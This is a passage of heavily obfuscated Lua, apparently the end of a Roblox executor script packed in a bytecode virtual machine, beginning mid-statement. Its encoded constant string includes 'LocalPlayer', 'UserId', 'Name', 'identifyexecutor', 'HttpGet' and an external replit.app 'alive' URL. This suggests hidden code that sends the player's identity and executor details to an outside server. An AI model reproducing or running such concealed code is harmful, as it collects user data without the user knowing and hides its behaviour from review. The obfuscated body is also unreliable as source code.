]);v79=v79 + (603 -(512 + 90)) ;v87=v75[v79];v79=v87[1909 -((2565 -900) + 241) ];end elseif (v88>(769 -((1158 -(222 + 563)) + (757 -413)))) then v85[v87[2]][v87[2 + 1 ]]=v85[v87[2 + 2 + 0 ]];else local v393;local v394;local v395;v85[v87[5 -3 ]]=v85[v87[(194 -(23 + 167)) -1 ]][v87[4]];v79=v79 + ((2898 -(690 + 1108)) -(35 + 1064)) ;v87=v75[v79];v85[v87[2 + 0 ]]=v85[v87[6 -3 ]];v79=v79 + 1 + 0 ;v87=v75[v79];v395=v87[3];v394=v85[v395];for v428=v395 + (1237 -(298 + 938)) ,v87[4] do v394=v394   .. v85[v428] ;end v85[v87[1261 -(233 + 371 + 655) ]]=v394;v79=v79 + (1667 -(636 + 1030)) ;v87=v75[v79];v393=v87[2 + 0 ];v85[v393](v85[v393 + 1 + 0 ]);v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[1 + 1 ]]=v87[224 -(55 + 166) ];v79=v79 + 1 + 0 ;v87=v75[v79];v79=v87[1 + 2 ];end v79=v79 + (3 -2) ;break;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!3B3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q003140030A3Q0081516811BA0BD35B624903063Q007EA7341074D9026Q003040030A3Q004103AA2E1518B826024B03043Q004B6776D9026Q002E4003083Q00D4E52158EA8E8FAD03063Q00C7EB90523D98026Q002C40030A3Q0093F12FC80DBA3CD5ECA903083Q00A7D6894AAB78CE53026Q002A4003073Q0039C0557C7160FD03083Q00876CAE3E121E1793026Q00244003083Q008BD543441BA9830203053Q007EDBB9223D026Q00224003073Q00678622CF23C95C03063Q00BE32E849A14C026Q00204003083Q009FD83935308E917C03053Q0079CAAB5C47026Q001840031A3Q0019EC2199AE31199931BF99142FCB42A88E113AD60CBE8E06709903063Q00624AB962DAEB026Q00104003053Q003BBFC2DBFF03053Q00934BDCA3B7028Q0003163Q007C3F562445723651295037094C354470532A5C4C3E1103073Q005A305035452922026Q00F03F027Q0040026Q00084003043Q007761726E03313Q00682Q7470733A2Q2F616C6976652D7365727665722Q2D6577612Q7372653Q642E7265706C69742E612Q702F616C69766503043Q0067616D6503073Q00506C6179657273030B3Q004C6F63616C506C6179657203023Q005F4703053Q007072696E74030C3Q00E29C97204661696C65643A2003083Q00746F737472696E6703103Q006964656E746966796578656375746F7203043Q007761697403063Q0055736572496403043Q004E616D6500F34Q00257Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B00010001002Q043Q000B0001001227000400063Q002011000500040007001227000600083Q002011000600060009001227000700083Q00201100070007000A00061000083Q000100062Q000C3Q00074Q000C3Q00014Q000C3Q00054Q000C3Q00024Q000C3Q00034Q000C3Q00064Q000F000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00092Q000F000900083Q00122Q000A00123Q00122Q000B00136Q0009000B000200104Q001100094Q000900083Q00122Q000A00153Q00122Q000B00166Q0009000B000200104Q001400092Q000F000900083Q00122Q000A00183Q00122Q000B00196Q0009000B000200104Q001700094Q000900083Q00122Q000A001B3Q00122Q000B001C6Q0009000B000200104Q001A00092Q000F000900083Q00122Q000A001E3Q00122Q000B001F6Q0009000B000200104Q001D00094Q000900083Q00122Q000A00213Q00122Q000B00226Q0009000B000200104Q002000092Q000F000900083Q00122Q000A00243Q00122Q000B00256Q0009000B000200104Q002300094Q000900083Q00122Q000A00273Q00122Q000B00286Q0009000B000200104Q002600092Q000C000900083Q001231000A002A3Q001231000B002B4Q002C0009000B00020010353Q00290009001231000900294Q001D000A00133Q002622000900540001002C002Q043Q005400012Q001D000D000F3Q0012310009002D3Q002622000900580001002D002Q043Q005800012Q001D001000123Q0012310009002E3Q0026220009005D00010029002Q043Q005D0001001231000A00294Q001D000B000C3Q0012310009002C3Q002622000900500001002E002Q043Q005000012Q001D001300133Q002622000A008300010029002Q043Q00830001001231001400293Q0026220014007B0001002C002Q043Q007B000100062B000C007900010001002Q043Q00790001001231001500294Q001D001600163Q0026220015006900010029002Q043Q00690001001231001600293Q0026220016006C00010029002Q043Q006C0001001231001700293Q0026220017006F00010029002Q043Q006F00010012270018002F3Q00201100193Q00292Q00140018000200012Q00033Q00013Q002Q043Q006F0001002Q043Q006C0001002Q043Q00790001002Q043Q00690001001231000A002C3Q002Q043Q008300010026220014006300010029002Q043Q00630001001231000B00303Q001215001500313Q00202Q00150015003200202Q000C0015003300122Q0014002C3Q00044Q00630001002622000A009D00010026002Q043Q009D0001001227001400343Q00201100153Q00262Q001900140014001500061000150001000100012Q000C3Q00114Q00290014000200152Q000C001300154Q000C001200143Q00061C0012009500013Q002Q043Q00950001001227001400353Q00203200153Q00234Q001600136Q0015001500164Q00140002000100044Q00F10001001227001400353Q00122A001500363Q00122Q001600376Q001700136Q0016000200024Q0015001500164Q00140002000100044Q00F10001002622000A00BC0001002D002Q043Q00BC0001001231001400293Q002622001400AB0001002C002Q043Q00AB0001001227001500353Q00200E00163Q002000122Q001700376Q0018000D6Q0017000200024Q0016001600174Q00150002000100122Q000A002E3Q00044Q00BC0001000E16002900A000010014002Q043Q00A00001001227001500383Q00061C001500B400013Q002Q043Q00B40001001227001500384Q001F001500010002000623000F00B500010015002Q043Q00B50001002011000F3Q001D001227001500353Q00203400163Q001A4Q0017000E6Q0016001600174Q00150002000100122Q0014002C3Q00044Q00A00001002622000A00D20001002C002Q043Q00D20001001231001400293Q002622001400C900010029002Q043Q00C90001001227001500393Q0012310016002C4Q00140015000200010020110015000C003A000623000D00C800010015002Q043Q00C80001001231000D00293Q0012310014002C3Q002622001400BF0001002C002Q043Q00BF00010020110015000C003B000623000E00CF00010015002Q043Q00CF0001002011000E3Q0017001231000A002D3Q002Q043Q00D20001002Q043Q00BF0001002622000A00600001002E002Q043Q00600001001231001400293Q002622001400DC0001002C002Q043Q00DC00012Q000C0015000B4Q000C001600104Q0028001100150016001231000A00263Q002Q043Q00600001002622001400D500010029002Q043Q00D50001001227001500353Q00202400163Q00144Q0017000F6Q0016001600174Q00150002000100202Q00153Q001100122Q001600376Q0017000D6Q00160002000200202Q00173Q000E4Q0018000E3Q00201100193Q000B2Q000C001A000F4Q002800100015001A0012310014002C3Q002Q043Q00D50001002Q043Q00600001002Q043Q00F10001002Q043Q005000012Q000700096Q00033Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q000900025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q001A00076Q002E000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004170003000500012Q001A000300054Q000C000400024Q0012000300044Q002D00036Q00033Q00017Q00023Q0003043Q0067616D6503073Q00482Q747047657400063Q00120D3Q00013Q00206Q00024Q00029Q0000029Q008Q00017Q00",v9(),...);
